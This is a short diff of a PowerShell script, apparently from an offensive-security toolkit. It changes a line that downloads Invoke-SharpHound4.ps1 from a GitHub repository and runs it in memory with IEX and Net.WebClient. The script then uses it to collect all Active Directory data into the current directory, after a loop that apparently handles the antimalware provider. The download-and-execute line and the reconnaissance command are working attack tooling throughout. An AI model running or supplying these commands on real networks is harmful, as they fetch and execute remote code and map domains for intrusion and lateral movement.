@@ -40,5 +40,5 @@ while ($AntimalwareProvider -ne 0)
 }
 
 $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
 Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
